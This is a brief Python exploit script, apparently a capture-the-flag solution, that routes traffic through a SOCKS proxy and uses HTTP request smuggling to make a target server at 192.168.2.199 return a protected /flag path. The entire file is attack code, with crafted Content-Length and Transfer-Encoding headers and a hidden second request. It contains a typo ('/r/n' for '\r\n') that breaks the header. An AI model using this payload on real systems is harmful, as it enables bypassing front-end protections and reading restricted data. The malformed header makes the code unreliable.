import socks
import socket

socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 8123)
socket.socket = socks.socksocket

target_host = "192.168.2.199"
target_port = 61119
smuggled_host = "14828"

def send_request(request):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, target_port))
    sock.send(request)
    response = sock.recv(8192)
    sock.close()
    return response

# First request

smuggle = ( b"0\r\n\r\n" 
    b"GET /flag HTTP/1.1\r\n"
    b"Host: " + smuggled_host.encode() + b"\r\n"
)

response1 = send_request(
    b"GET / HTTP/1.1\r\n"
    b"Host: " + target_host.encode() + b"\r\n"
    b"Content-Length: " + str(len(smuggle)).encode() + b"/r/n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    + smuggle
)

print("[+] First response:\n", response1.decode())

# Second request (smuggled)
response2 = send_request(
    b"GET /flag.html HTTP/1.1\r\n"
    b"Host: " + target_host.encode() + b"\r\n\r\n"
)
print("[+] Second response:\n", response2.decode())
